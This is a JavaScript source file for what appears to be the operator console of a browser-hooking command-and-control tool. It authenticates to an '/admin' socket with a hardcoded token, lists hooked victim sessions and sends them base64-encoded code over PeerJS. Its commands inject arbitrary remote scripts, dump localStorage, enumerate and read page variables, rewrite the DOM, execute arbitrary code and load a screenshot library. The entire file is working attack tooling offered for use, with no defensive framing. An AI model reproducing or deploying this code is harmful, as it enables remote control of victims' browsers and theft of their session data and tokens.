const socket = io("/admin", {
    auth: {
        token: "2f35c1073c86b7087a504ad9183f6a24ced9f49a7b29f5aac60acccadd62cafb"
    }
});
var privateKey = "RSA_KEY";
var peer = new Peer();
var currentConnection;

function connect(id) {
    var conn = peer.connect(id);
    currentConnection = conn;
    conn.on('open', function() {
        console.log("connected to peer:", id);
        // Receive messages
        conn.on('data', function(data) {
            console.log('Received:', data);
        });

        // Send messages
        // conn.send('Hello!');
    });

    conn.on('error', function(err) {
        console.error('Connection error:', err);
    });
}

async function sendCMD(type,data) {
    switch (type){
        case "inject":
            await SendPackagedCode(`
                (function() {
                    var j = document.createElement("script");
                    j.src = '${data}';
                    j.onload = function() {
                        _return(true);
                    }
                    document.body.appendChild(j);
                })();    
            `)
        break;
        case "screeshot":
        
        break;
        case "info": 
            await SendPackagedCode(`
                _return({
                    "hash": window.location.hash,
                    "host": window.location.host,
                    "hostname": window.location.hostname,
                    "href": window.location.href,
                    "origin": window.location.origin,
                    "pathname": window.location.pathname,
                    "port": window.location.port,
                    "protocol": window.location.protocol
                });    
            `)  
        break;
        case "localstorage":
            await SendPackagedCode(`
                _return(localStorage);    
            `)
        break;
        case "code":
            await SendPackagedCode(data);
        break;
        case "varibles":
            if (data == undefined) {
                await SendPackagedCode(`
                    (function() {
                        var _p = Object.keys(window).filter(prop => !built_in.includes(prop));
                        var _r = {};
                        for (var i in _p) {
                            _r[_p[i]] = typeof window[_p[i]]
                        }
                        _return(_r);
                    })(); 
                    
                `)
            }else {
                await SendPackagedCode(`
                    _return(window["${data}"]);    
                `)
            }
        break;
        case "editDOM":
            await SendPackagedCode(`
                (function() {
                    var _p = document.createElement("div");
                    _p.innerHTML = atob("${btoa(data)}")
                    document.body.appendChild(_p);
                    _return(true);
                })();    
            `)
        break;
        case "setUp": 
            await SendPackagedCode(`
                (function() {
                    var j = document.createElement("script");
                    j.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
                    j.onload = function() {
                        _return(true);
                    }
                    document.body.appendChild(j);
                })();    
            `);
            await SendPackagedCode(`
                (function() {
                    var j = document.createElement("script");
                    j.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js';
                    j.onload = function() {
                        _return(true);
                    }
                    document.body.appendChild(j);
                })();    
            `)
        break;
        

        default: 
        console.log("Type not found");
    }
}

async function SendPackagedCode(code) {
    try {
        await currentConnection.send({
            "code": btoa(code),
            "key": privateKey
        });
        return true;
    }catch {
        return false;
    }
}

socket.on('connect', () => {
    console.log("socket connected");
    setTimeout(() => {
        socket.emit("getHooks", "");
    });
});

socket.on("hooks", (data) => {
    console.log(data);
    if (data && data.length > 0) {
        connect(data[0].peer); // Assuming data contains peer IDs
    }
});
